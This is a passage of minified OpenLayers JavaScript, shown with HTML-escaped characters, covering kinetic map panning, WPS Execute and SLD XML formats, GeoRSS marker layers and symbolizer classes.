Date).getTime(),d=0,e=this.points.length,f;d&lt;e;d++)&#123;f=this.points[d];if(c-f.tick&gt;this.delay)break;b=f&#125;if(b&amp;&amp;(d=(new Date).getTime()-b.tick,c=Math.sqrt(Math.pow(a.x-b.xy.x,2)+Math.pow(a.y-b.xy.y,2)),d=c/d,!(0==d||d&lt;this.threshold)))return c=Math.asin((a.y-b.xy.y)/c),b.xy.x&lt;=a.x&amp;&amp;(c=Math.PI-c),&#123;speed:d,theta:c&#125;&#125;,move:function(a,b)&#123;var c=a.speed,d=Math.cos(a.theta),e=-Math.sin(a.theta),f=(new Date).getTime(),g=0,h=0;this.timerId=OpenLayers.Animation.start(OpenLayers.Function.bind(function()&#123;if(null!=this.timerId)&#123;var a=(new Date).getTime()-f,l=-this.deceleration*Math.pow(a,2)/2+c*a,m=l*d,l=l*e,n,p;n=!1;0&gt;=-this.deceleration*a+c&amp;&amp;(OpenLayers.Animation.stop(this.timerId),this.timerId=null,n=!0);a=m-g;p=l-h;g=m;h=l;b(a,p,n)&#125;&#125;,this))&#125;,CLASS_NAME:"OpenLayers.Kinetic"&#125;);OpenLayers.Format.WPSExecute=OpenLayers.Class(OpenLayers.Format.XML,OpenLayers.Format.Filter.v1_1_0,&#123;namespaces:&#123;ows:"http://www.opengis.net/ows/1.1",gml:"http://www.opengis.net/gml",wps:"http://www.opengis.net/wps/1.0.0",wfs:"http://www.opengis.net/wfs",ogc:"http://www.opengis.net/ogc",wcs:"http://www.opengis.net/wcs",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd",schemaLocationAttr:function(a)&#123;&#125;,write:function(a)&#123;var b;window.ActiveXObject?this.xmldom=b=new ActiveXObject("Microsoft.XMLDOM"):b=document.implementation.createDocument("","",null);a=this.writeNode("wps:Execute",a,b);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;&#125;;this.readNode(a,b);return b&#125;,writers:&#123;wps:&#123;Execute:function(a)&#123;var b=this.createElementNSPlus("wps:Execute",&#123;attributes:&#123;version:this.VERSION,service:"WPS"&#125;&#125;);this.writeNode("ows:Identifier",a.identifier,b);this.writeNode("wps:DataInputs",a.dataInputs,b);this.writeNode("wps:ResponseForm",a.responseForm,b);return b&#125;,ResponseForm:function(a)&#123;var b=this.createElementNSPlus("wps:ResponseForm",&#123;&#125;);a.rawDataOutput&amp;&amp;this.writeNode("wps:RawDataOutput",a.rawDataOutput,b);a.responseDocument&amp;&amp;this.writeNode("wps:ResponseDocument",a.responseDocument,b);return b&#125;,ResponseDocument:function(a)&#123;var b=this.createElementNSPlus("wps:ResponseDocument",&#123;attributes:&#123;storeExecuteResponse:a.storeExecuteResponse,lineage:a.lineage,status:a.status&#125;&#125;);if(a.outputs)for(var c=0,d=a.outputs.length;c&lt;d;c++)this.writeNode("wps:Output",a.outputs[c],b);return b&#125;,Output:function(a)&#123;var b=this.createElementNSPlus("wps:Output",&#123;attributes:&#123;asReference:a.asReference,mimeType:a.mimeType,encoding:a.encoding,schema:a.schema&#125;&#125;);this.writeNode("ows:Identifier",a.identifier,b);this.writeNode("ows:Title",a.title,b);this.writeNode("ows:Abstract",a["abstract"],b);return b&#125;,RawDataOutput:function(a)&#123;var b=this.createElementNSPlus("wps:RawDataOutput",&#123;attributes:&#123;mimeType:a.mimeType,encoding:a.encoding,schema:a.schema&#125;&#125;);this.writeNode("ows:Identifier",a.identifier,b);return b&#125;,DataInputs:function(a)&#123;for(var b=this.createElementNSPlus("wps:DataInputs",&#123;&#125;),c=0,d=a.length;c&lt;d;++c)this.writeNode("wps:Input",a[c],b);return b&#125;,Input:function(a)&#123;var b=this.createElementNSPlus("wps:Input",&#123;&#125;);this.writeNode("ows:Identifier",a.identifier,b);a.title&amp;&amp;this.writeNode("ows:Title",a.title,b);a.data&amp;&amp;this.writeNode("wps:Data",a.data,b);a.reference&amp;&amp;this.writeNode("wps:Reference",a.reference,b);a.boundingBoxData&amp;&amp;this.writeNode("wps:BoundingBoxData",a.boundingBoxData,b);return b&#125;,Data:function(a)&#123;var b=this.createElementNSPlus("wps:Data",&#123;&#125;);a.literalData?this.writeNode("wps:LiteralData",a.literalData,b):a.complexData?this.writeNode("wps:ComplexData",a.complexData,b):a.boundingBoxData&amp;&amp;this.writeNode("ows:BoundingBox",a.boundingBoxData,b);return b&#125;,LiteralData:function(a)&#123;return this.createElementNSPlus("wps:LiteralData",&#123;attributes:&#123;uom:a.uom&#125;,value:a.value&#125;)&#125;,ComplexData:function(a)&#123;var b=this.createElementNSPlus("wps:ComplexData",&#123;attributes:&#123;mimeType:a.mimeType,encoding:a.encoding,schema:a.schema&#125;&#125;),c=a.value;"string"===typeof c?b.appendChild(this.getXMLDoc().createCDATASection(a.value)):b.appendChild(c);return b&#125;,Reference:function(a)&#123;var b=this.createElementNSPlus("wps:Reference",&#123;attributes:&#123;mimeType:a.mimeType,"xlink:href":a.href,method:a.method,encoding:a.encoding,schema:a.schema&#125;&#125;);a.body&amp;&amp;this.writeNode("wps:Body",a.body,b);return b&#125;,BoundingBoxData:function(a,b)&#123;this.writers.ows.BoundingBox.apply(this,[a,b,"wps:BoundingBoxData"])&#125;,Body:function(a)&#123;var b=this.createElementNSPlus("wps:Body",&#123;&#125;);a.wcs?this.writeNode("wcs:GetCoverage",a.wcs,b):a.wfs?(this.featureType=a.wfs.featureType,this.version=a.wfs.version,this.writeNode("wfs:GetFeature",a.wfs,b)):this.writeNode("wps:Execute",a,b);return b&#125;&#125;,wcs:OpenLayers.Format.WCSGetCoverage.prototype.writers.wcs,wfs:OpenLayers.Format.WFST.v1_1_0.prototype.writers.wfs,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc,ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.writers.ows&#125;,readers:&#123;wps:&#123;ExecuteResponse:function(a,b)&#123;b.executeResponse=&#123;lang:a.getAttribute("lang"),statusLocation:a.getAttribute("statusLocation"),serviceInstance:a.getAttribute("serviceInstance"),service:a.getAttribute("service")&#125;;this.readChildNodes(a,b.executeResponse)&#125;,Process:function(a,b)&#123;b.process=&#123;&#125;;this.readChildNodes(a,b.process)&#125;,Status:function(a,b)&#123;b.status=&#123;creationTime:a.getAttribute("creationTime")&#125;;this.readChildNodes(a,b.status)&#125;,ProcessSucceeded:function(a,b)&#123;b.processSucceeded=!0&#125;,ProcessOutputs:function(a,b)&#123;b.processOutputs=[];this.readChildNodes(a,b.processOutputs)&#125;,Output:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.push(c)&#125;,Reference:function(a,b)&#123;b.reference=&#123;href:a.getAttribute("href"),mimeType:a.getAttribute("mimeType"),encoding:a.getAttribute("encoding"),schema:a.getAttribute("schema")&#125;&#125;,Data:function(a,b)&#123;b.data=&#123;&#125;;this.readChildNodes(a,b)&#125;,LiteralData:function(a,b)&#123;b.literalData=&#123;dataType:a.getAttribute("dataType"),uom:a.getAttribute("uom"),value:this.getChildValue(a)&#125;&#125;,ComplexData:function(a,b)&#123;b.complexData=&#123;mimeType:a.getAttribute("mimeType"),schema:a.getAttribute("schema"),encoding:a.getAttribute("encoding"),value:""&#125;;if(this.isSimpleContent(a))&#123;var c;for(c=a.firstChild;c;c=c.nextSibling)switch(c.nodeType)&#123;case 3:case 4:b.complexData.value+=c.nodeValue&#125;&#125;else for(c=a.firstChild;c;c=c.nextSibling)1==c.nodeType&amp;&amp;(b.complexData.value=c)&#125;,BoundingBox:function(a,b)&#123;b.boundingBoxData=&#123;dimensions:a.getAttribute("dimensions"),crs:a.getAttribute("crs")&#125;;this.readChildNodes(a,b.boundingBoxData)&#125;&#125;,ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows&#125;,CLASS_NAME:"OpenLayers.Format.WPSExecute"&#125;);OpenLayers.Layer.GeoRSS=OpenLayers.Class(OpenLayers.Layer.Markers,&#123;location:null,features:null,formatOptions:null,selectedFeature:null,icon:null,popupSize:null,useFeedTitle:!0,initialize:function(a,b,c)&#123;OpenLayers.Layer.Markers.prototype.initialize.apply(this,[a,c]);this.location=b;this.features=[]&#125;,destroy:function()&#123;OpenLayers.Layer.Markers.prototype.destroy.apply(this,arguments);this.clearFeatures();this.features=null&#125;,loadRSS:function()&#123;this.loaded||(this.events.triggerEvent("loadstart"),OpenLayers.Request.GET(&#123;url:this.location,success:this.parseData,scope:this&#125;),this.loaded=!0)&#125;,moveTo:function(a,b,c)&#123;OpenLayers.Layer.Markers.prototype.moveTo.apply(this,arguments);this.visibility&amp;&amp;!this.loaded&amp;&amp;this.loadRSS()&#125;,parseData:function(a)&#123;var b=a.responseXML;b&amp;&amp;b.documentElement||(b=OpenLayers.Format.XML.prototype.read(a.responseText));if(this.useFeedTitle)&#123;a=null;try&#123;a=b.getElementsByTagNameNS("*","title")[0].firstChild.nodeValue&#125;catch(c)&#123;a=b.getElementsByTagName("title")[0].firstChild.nodeValue&#125;a&amp;&amp;this.setName(a)&#125;a=&#123;&#125;;OpenLayers.Util.extend(a,this.formatOptions);this.map&amp;&amp;!this.projection.equals(this.map.getProjectionObject())&amp;&amp;(a.externalProjection=this.projection,a.internalProjection=this.map.getProjectionObject());b=(new OpenLayers.Format.GeoRSS(a)).read(b);a=0;for(var d=b.length;a&lt;d;a++)&#123;var e=&#123;&#125;,f=b[a];if(f.geometry)&#123;var g=f.attributes.title?f.attributes.title:"Untitled",h=f.attributes.description?f.attributes.description:"No description.",k=f.attributes.link?f.attributes.link:"",f=f.geometry.getBounds().getCenterLonLat();e.icon=null==this.icon?OpenLayers.Marker.defaultIcon():this.icon.clone();e.popupSize=this.popupSize?this.popupSize.clone():new OpenLayers.Size(250,120);if(g||h)&#123;e.title=g;e.description=h;var l='&lt;div class="olLayerGeoRSSClose"&gt;[x]&lt;/div&gt;',l=l+'&lt;div class="olLayerGeoRSSTitle"&gt;';k&amp;&amp;(l+='&lt;a class="link" href="'+k+'" target="_blank"&gt;');l+=g;k&amp;&amp;(l+="&lt;/a&gt;");l+="&lt;/div&gt;";l+='&lt;div style="" class="olLayerGeoRSSDescription"&gt;';l+=h;l+="&lt;/div&gt;";e.popupContentHTML=l&#125;f=new OpenLayers.Feature(this,f,e);this.features.push(f);e=f.createMarker();e.events.register("click",f,this.markerClick);this.addMarker(e)&#125;&#125;this.events.triggerEvent("loadend")&#125;,markerClick:function(a)&#123;var b=this==this.layer.selectedFeature;this.layer.selectedFeature=b?null:this;for(var c=0,d=this.layer.map.popups.length;c&lt;d;c++)this.layer.map.removePopup(this.layer.map.popups[c]);b||(b=this.createPopup(),OpenLayers.Event.observe(b.div,"click",OpenLayers.Function.bind(function()&#123;for(var a=0,b=this.layer.map.popups.length;a&lt;b;a++)this.layer.map.removePopup(this.layer.map.popups[a])&#125;,this)),this.layer.map.addPopup(b));OpenLayers.Event.stop(a)&#125;,clearFeatures:function()&#123;if(null!=this.features)for(;0&lt;this.features.length;)&#123;var a=this.features[0];OpenLayers.Util.removeItem(this.features,a);a.destroy()&#125;&#125;,CLASS_NAME:"OpenLayers.Layer.GeoRSS"&#125;);OpenLayers.Symbolizer.Point=OpenLayers.Class(OpenLayers.Symbolizer,&#123;initialize:function(a)&#123;OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Symbolizer.Point"&#125;);OpenLayers.Symbolizer.Line=OpenLayers.Class(OpenLayers.Symbolizer,&#123;initialize:function(a)&#123;OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Symbolizer.Line"&#125;);OpenLayers.Symbolizer.Text=OpenLayers.Class(OpenLayers.Symbolizer,&#123;initialize:function(a)&#123;OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)&#125;,CLASS_NAME:"OpenLayers.Symbolizer.Text"&#125;);OpenLayers.Format.SLD.v1=OpenLayers.Class(OpenLayers.Format.Filter.v1_0_0,&#123;namespaces:&#123;sld:"http://www.opengis.net/sld",ogc:"http://www.opengis.net/ogc",gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,defaultPrefix:"sld",schemaLocation:null,multipleSymbolizers:!1,featureTypeCounter:null,defaultSymbolizer:&#123;fillColor:"#808080",fillOpacity:1,strokeColor:"#000000",strokeOpacity:1,strokeWidth:1,strokeDashstyle:"solid",pointRadius:3,graphicName:"square"&#125;,read:function(a,b)&#123;b=OpenLayers.Util.applyDefaults(b,this.options);var c=&#123;namedLayers:!0===b.namedLayersAsArray?[]:&#123;&#125;&#125;;this.readChildNodes(a,c);return c&#125;,readers:OpenLayers.Util.applyDefaults(&#123;sld:&#123;StyledLayerDescriptor:function(a,b)&#123;b.version=a.getAttribute("version");this.readChildNodes(a,b)&#125;,Name:function(a,b)&#123;b.name=this.getChildValue(a)&#125;,Title:function(a,b)&#123;b.title=this.getChildValue(a)&#125;,Abstract:function(a,b)&#123;b.description=this.getChildValue(a)&#125;,NamedLayer:function(a,b)&#123;var c=&#123;userStyles:[],namedStyles:[]&#125;;this.readChildNodes(a,c);for(var d=0,e=c.userStyles.length;d&lt;e;++d)c.userStyles[d].layerName=c.name;OpenLayers.Util.isArray(b.namedLayers)?b.namedLayers.push(c):b.namedLayers[c.name]=c&#125;,NamedStyle:function(a,b)&#123;b.namedStyles.push(this.getChildName(a.firstChild))&#125;,UserStyle:function(a,b)&#123;var c=&#123;defaultsPerSymbolizer:!0,rules:[]&#125;;this.featureTypeCounter=-1;this.readChildNodes(a,c);this.multipleSymbolizers?(delete c.defaultsPerSymbolizer,c=new OpenLayers.Style2(c)):c=new OpenLayers.Style(this.defaultSymbolizer,c);b.userStyles.push(c)&#125;,IsDefault:function(a,b)&#123;"1"==this.getChildValue(a)&amp;&amp;(b.isDefault=!0)&#125;,FeatureTypeStyle:function(a,b)&#123;++this.featureTypeCounter;var c=&#123;rules:this.multipleSymbolizers?b.rules:[]&#125;;this.readChildNodes(a,c);this.multipleSymbolizers||(b.rules=c.rules)&#125;,Rule:function(a,b)&#123;var c;this.multipleSymbolizers&amp;&amp;(c=&#123;symbolizers:[]&#125;);c=new OpenLayers.Rule(c);this.readChildNodes(a,c);b.rules.push(c)&#125;,ElseFilter:function(a,b)&#123;b.elseFilter=!0&#125;,MinScaleDenominator:function(a,b)&#123;b.minScaleDenominator=parseFloat(this.getChildValue(a))&#125;,MaxScaleDenominator:function(a,b)&#123;b.maxScaleDenominator=parseFloat(this.getChildValue(a))&#125;,TextSymbolizer:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Text(c))):b.symbolizer.Text=OpenLayers.Util.applyDefaults(c,b.symbolizer.Text)&#125;,LabelPlacement:function(a,b)&#123;this.readChildNodes(a,b)&#125;,PointPlacement:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);c.labelRotation=c.rotation;delete c.rotation;var d,e=b.labelAnchorPointX,f=b.labelAnchorPointY;e&lt;=1/3?d="l":e&gt;1/3&amp;&amp;e&lt;2/3?d="c":e&gt;=2/3&amp;&amp;(d="r");f&lt;=1/3?d+="b":f&gt;1/3&amp;&amp;f&lt;2/3?d+="m":f&gt;=2/3&amp;&amp;(d+="t");c.labelAlign=d;OpenLayers.Util.applyDefaults(b,c)&#125;,AnchorPoint:function(a,b)&#123;this.readChildNodes(a,b)&#125;,AnchorPointX:function(a,b)&#123;var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelAnchorPointX=c)&#125;,AnchorPointY:function(a,b)&#123;var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelAnchorPointY=c)&#125;,Displacement:function(a,b)&#123;this.readChildNodes(a,b)&#125;,DisplacementX:function(a,b)&#123;var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelXOffset=c)&#125;,DisplacementY:function(a,b)&#123;var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelYOffset=c)&#125;,LinePlacement:function(a,b)&#123;this.readChildNodes(a,b)&#125;,PerpendicularOffset:function(a,b)&#123;var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.labelPerpendicularOffset=c)&#125;,Label:function(a,b)&#123;var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.label=c)&#125;,Font:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Halo:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.haloRadius=c.haloRadius;b.haloColor=c.fillColor;b.haloOpacity=c.fillOpacity&#125;,Radius:function(a,b)&#123;var c=this.readers.ogc._expression.call(this,a);null!=c&amp;&amp;(b.haloRadius=c)&#125;,RasterSymbolizer:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Raster(c))):b.symbolizer.Raster=OpenLayers.Util.applyDefaults(c,b.symbolizer.Raster)&#125;,Geometry:function(a,b)&#123;b.geometry=&#123;&#125;;this.readChildNodes(a,b.geometry)&#125;,ColorMap:function(a,b)&#123;b.colorMap=[];this.readChildNodes(a,b.colorMap)&#125;,ColorMapEntry:function(a,b)&#123;var c=a.getAttribute("quantity"),d=a.getAttribute("opacity");b.push(&#123;color:a.getAttribute("color"),quantity:null!==c?parseFloat(c):void 0,label:a.getAttribute("label")||void 0,opacity:null!==d?parseFloat(d):void 0&#125;)&#125;,LineSymbolizer:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Line(c))):b.symbolizer.Line=OpenLayers.Util.applyDefaults(c,b.symbolizer.Line)&#125;,PolygonSymbolizer:function(a,b)&#123;var c=&#123;fill:!1,stroke:!1&#125;;this.multipleSymbolizers||(c=b.symbolizer.Polygon||c);this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Polygon(c))):b.symbolizer.Polygon=c&#125;,PointSymbolizer:function(a,b)&#123;var c=&#123;fill:!1,stroke:!1,graphic:!1&#125;;this.multipleSymbolizers||(c=b.symbolizer.Point||c);this.readChildNodes(a,c);this.multipleSymbolizers?(c.zIndex=this.featureTypeCounter,b.symbolizers.push(new OpenLayers.Symbolizer.Point(c))):b.symbolizer.Point=c&#125;,Stroke:function(a,b)&#123;b.stroke=!0;this.readChildNodes(a,b)&#125;,Fill:function(a,b)&#123;b.fill=!0;this.readChildNodes(a,b)&#125;,CssParameter:function(a,b)&#123;var c=a.getAttribute("name"),d=this.cssMap[c];b.label&amp;&amp;("fill"===c?d="fontColor":"fill-opacity"===c&amp;&amp;(d="fontOpacity"));d&amp;&amp;(c=this.readers.ogc._expression.call(this,a))&amp;&amp;(b[d]=c)&#125;,Graphic:function(a,b)&#123;b.graphic=!0;var c=&#123;&#125;;this.readChildNodes(a,c);for(var d="stroke strokeColor strokeWidth strokeOpacity strokeLinecap fill fillColor fillOpacity graphicName rotation graphicFormat".split(" "),e,f,g=0,h=d.length;g&lt;h;++g)e=d[g],f=c[e],void 0!=f&amp;&amp;(b[e]=f);void 0!=c.opacity&amp;&amp;(b.graphicOpacity=c.opacity);void 0!=c.size&amp;&amp;(isNaN(c.size/2)?b.graphicWidth=c.size:b.pointRadius=c.size/2);void 0!=c.href&amp;&amp;(b.externalGraphic=c.href);void 0!=c.rotation&amp;&amp;(b.rotation=c.rotation)&#125;,ExternalGraphic:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Mark:function(a,b)&#123;this.readChildNodes(a,b)&#125;,WellKnownName:function(a,b)&#123;b.graphicName=this.getChildValue(a)&#125;,Opacity:function(a,b)&#123;var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.opacity=c)&#125;,Size:function(a,b)&#123;var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.size=c)&#125;,Rotation:function(a,b)&#123;var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.rotation=c)&#125;,OnlineResource:function(a,b)&#123;b.href=this.getAttributeNS(a,this.namespaces.xlink,"href")&#125;,Format:function(a,b)&#123;b.graphicFormat=this.getChildValue(a)&#125;&#125;&#125;,OpenLayers.Format.Filter.v1_0_0.prototype.readers),cssMap:&#123;stroke:"strokeColor","stroke-opacity":"strokeOpacity","stroke-width":"strokeWidth","stroke-linecap":"strokeLinecap","stroke-dasharray":"strokeDashstyle",fill:"fillColor","fill-opacity":"fillOpacity","font-family":"fontFamily","font-size":"fontSize","font-weight":"fontWeight","font-style":"fontStyle"&#125;,getCssProperty:function(a)&#123;var b=null,c;for(c in this.cssMap)if(this.cssMap[c]==a)&#123;b=c;break&#125;return b&#125;,getGraphicFormat:function(a)&#123;var b,c;for(c in this.graphicFormats)if(this.graphicFormats[c].test(a))&#123;b=c;break&#125;return b||this.defaultGraphicFormat&#125;,defaultGraphicFormat:"image/png",graphicFormats:&#123;"image/jpeg":/\.jpe?g$/i,"image/gif":/\.gif$/i,"image/png":/\.png$/i&#125;,write:function(a)&#123;return this.writers.sld.StyledLayerDescriptor.apply(this,[a])&#125;,writers:OpenLayers.Util.applyDefaults(&#123;sld:&#123;_OGCExpression:function(a,b)&#123;var c=this.createElementNSPlus(a),d="string"==typeof b?b.split("$&#123;"):[b];c.appendChild(this.createTextNode(d[0]));for(var e,f,g=1,h=d.length;g&lt;h;g++)e=d[g],f=e.indexOf("&#125;"),0&lt;f?(this.writeNode("ogc:PropertyName",&#123;property:e.substring(0,f)&#125;,c),c.appendChild(this.createTextNode(e.substring(++f)))):c.appendChild(this.createTextNode("$&#123;"+e));return c&#125;,StyledLayerDescriptor:function(a)&#123;var b=this.createElementNSPlus("sld:StyledLayerDescriptor",&#123;attributes:&#123;version:this.VERSION,"xsi:schemaLocation":this.schemaLocation&#125;&#125;);b.setAttribute("xmlns:ogc",this.namespaces.ogc);b.setAttribute("xmlns:gml",this.namespaces.gml);a.name&amp;&amp;this.writeNode("Name",a.name,b);a.title&amp;&amp;this.writeNode("Title",a.title,b);a.description&amp;&amp;this.writeNode("Abstract",a.description,b);if(OpenLayers.Util.isArray(a.namedLayers))for(var c=0,d=a.namedLayers.length;c&lt;d;++c)this.writeNode("NamedLayer",a.namedLayers[c],b);else for(c in a.namedLayers)this.writeNode("NamedLayer",a.namedLayers[c],b);return b&#125;,Name:function(a)&#123;return this.createElementNSPlus("sld:Name",&#123;value:a&#125;)&#125;,Title:function(a)&#123;return this.createElementNSPlus("sld:Title",&#123;value:a&#125;)&#125;,Abstract:function(a)&#123;return this.createElementNSPlus("sld:Abstract",&#123;value:a&#125;)&#125;,NamedLayer:function(a)&#123;var b=this.createElementNSPlus("sld:NamedLayer");this.writeNode("Name",a.name,b);if(a.namedStyles)for(var c=0,d=a.namedStyles.length;c&lt;d;++c)this.writeNode("NamedStyle",a.namedStyles[c],b);if(a.userStyles)for(c=0,d=a.userStyles.length;c&lt;d;++c)this.writeNode("UserStyle",a.userStyles[c],b);return b&#125;,NamedStyle:function(a)&#123;var b=this.createElementNSPlus("sld:NamedStyle");this.writeNode("Name",a,b);return b&#125;,UserStyle:function(a)&#123;var b=this.createElementNSPlus("sld:UserStyle");a.name&amp;&amp;this.writeNode("Name",a.name,b);a.title&amp;&amp;this.writeNode("Title",a.title,b);a.description&amp;&amp;this.writeNode("Abstract",a.description,b);a.isDefault&amp;&amp;this.writeNode("IsDefault",a.isDefault,b);if(this.multipleSymbolizers&amp;&amp;a.rules)&#123;for(var c=&#123;0:[]&#125;,d=[0],e,f,g,h,k,l=0,m=a.rules.length;l&lt;m;++l)if(e=a.rules[l],e.symbolizers)&#123;f=&#123;&#125;;for(var n=0,p=e.symbolizers.length;n&lt;p;++n)g=e.symbolizers[n],h=g.zIndex,h in f||(k=e.clone(),k.symbolizers=[],f[h]=k),f[h].symbolizers.push(g.clone());for(h in f)h in c||(d.push(h),c[h]=[]),c[h].push(f[h])&#125;else c[0].push(e.clone());d.sort();l=0;for(m=d.length;l&lt;m;++l)e=c[d[l]],0&lt;e.length&amp;&amp;(k=a.clone(),k.rules=c[d[l]],this.writeNode("FeatureTypeStyle",k,b))&#125;else this.writeNode("FeatureTypeStyle",a,b);return b&#125;,IsDefault:function(a)&#123;return this.createElementNSPlus("sld:IsDefault",&#123;value:a?"1":"0"&#125;)&#125;,FeatureTypeStyle:function(a)&#123;for(var b=this.createElementNSPlus("sld:FeatureTypeStyle"),c=0,d=a.rules.length;c&lt;d;++c)this.writeNode("Rule",a.rules[c],b);return b&#125;,Rule:function(a)&#123;var b=this.createElementNSPlus("sld:Rule");a.name&amp;&amp;this.writeNode("Name",a.name,b);a.title&amp;&amp;this.writeNode("Title",a.title,b);a.description&amp;&amp;this.writeNode("Abstract",a.description,b);a.elseFilter?this.writeNode("ElseFilter",null,b):a.filter&amp;&amp;this.writeNode("ogc:Filter",a.filter,b);void 0!=a.minScaleDenominator&amp;&amp;this.writeNode("MinScaleDenominator",a.minScaleDenominator,b);void 0!=a.maxScaleDenominator&amp;&amp;this.writeNode("MaxScaleDenominator",a.maxScaleDenominator,b);var c,d;if(this.multipleSymbolizers&amp;&amp;a.symbolizers)for(var e=0,f=a.symbolizers.length;e&lt;f;++e)d=a.symbolizers[e],c=d.CLASS_NAME.split(".").pop(),this.writeNode(c+"Symbolizer",d,b);else for(var f=OpenLayers.Style.SYMBOLIZER_PREFIXES,e=0,g=f.length;e&lt;g;++e)c=f[e],(d=a.symbolizer[c])&amp;&amp;this.writeNode(c+"Symbolizer",d,b);return b&#125;,ElseFilter:function()&#123;return this.createElementNSPlus("sld:ElseFilter")&#125;,MinScaleDenominator:function(a)&#123;return this.createElementNSPlus("sld:MinScaleDenominator",&#123;value:a&#125;)&#125;,MaxScaleDenominator:function(a)&#123;return this.createElementNSPlus("sld:MaxScaleDenominator",&#123;value:a&#125;)&#125;,LineSymbolizer:function(a)&#123;var b=this.createElementNSPlus("sld:LineSymbolizer");this.writeNode("Stroke",a,b);return b&#125;,Stroke:function(a)&#123;var b=this.createElementNSPlus("sld:Stroke");void 0!=a.strokeColor&amp;&amp;this.writeNode("CssParameter",&#123;symbolizer:a,key:"strokeColor"&#125;,b);void 0!=a.strokeOpacity&amp;&amp;this.writeNode("CssParameter",&#123;symbolizer:a,key:"strokeOpacity"&#125;,b);void 0!=a.strokeWidth&amp;&amp;this.writeNode("CssParameter",&#123;symbolizer:a,key:"strokeWidth"&#125;,b);void 0!=a.strokeDashstyle&amp;&amp;"solid"!==a.strokeDashstyle&amp;&amp;this.writeNode("CssParameter",&#123;symbolizer:a,key:"strokeDashstyle"&#125;,b);void 0!=a.strokeLinecap&amp;&amp;this.writeNode("CssParameter",&#123;symbolizer:a,key:"strokeLinecap"&#125;,b);return b&#125;,CssParameter:function(a)&#123;return this.createElementNSPlus("sld:CssParameter",&#123;attributes:&#123;name:this.getCssProperty(a.key)&#125;,value:a.symbolizer[a.key]&#125;)&#125;,TextSymbolizer:function(a)&#123;var b=this.createElementNSPlus("sld:TextSymbolizer");null!=a.label&amp;&amp;this.writeNode("Label",a.label,b);null==a.fontFamily&amp;&amp;null==a.fontSize&amp;&amp;null==a.fontWeight&amp;&amp;null==a.fontStyle||this.writeNode("Font",a,b);null==a.labelAnchorPointX&amp;&amp;null==a.labelAnchorPointY&amp;&amp;null==a.labelAlign&amp;&amp;null==a.labelXOffset&amp;&amp;null==a.labelYOffset&amp;&amp;null==a.labelRotation&amp;&amp;null==a.labelPerpendicularOffset||this.writeNode("LabelPlacement",a,b);null==a.haloRadius&amp;&amp;null==a.haloColor&amp;&amp;null==a.haloOpacity||this.writeNode("Halo",a,b);null==a.fontColor&amp;&amp;null==a.fontOpacity||this.writeNode("Fill",&#123;fillColor:a.fontColor,fillOpacity:a.fontOpacity&#125;,b);return b&#125;,LabelPlacement:function(a)&#123;var b=this.createElementNSPlus("sld:LabelPlacement");null==a.labelAnchorPointX&amp;&amp;null==a.labelAnchorPointY&amp;&amp;null==a.labelAlign&amp;&amp;null==a.labelXOffset&amp;&amp;null==a.labelYOffset&amp;&amp;null==a.labelRotation||null!=a.labelPerpendicularOffset||this.writeNode("PointPlacement",a,b);null!=a.labelPerpendicularOffset&amp;&amp;this.writeNode("LinePlacement",a,b);return b&#125;,LinePlacement:function(a)&#123;var b=this.createElementNSPlus("sld:LinePlacement");this.writeNode("PerpendicularOffset",a.labelPerpendicularOffset,b);return b&#125;,PerpendicularOffset:function(a)&#123;return this.createElementNSPlus("sld:PerpendicularOffset",&#123;value:a&#125;)&#125;,PointPlacement:function(a)&#123;var b=this.createElementNSPlus("sld:PointPlacement");null==a.labelAnchorPointX&amp;&amp;null==a.labelAnchorPointY&amp;&amp;null==a.labelAlign||this.writeNode("AnchorPoint",a,b);null==a.labelXOffset&amp;&amp;null==a.labelYOffset||this.writeNode("Displacement",a,b);null!=a.labelRotation&amp;&amp;this.writeNode("Rotation",a.labelRotation,b);return 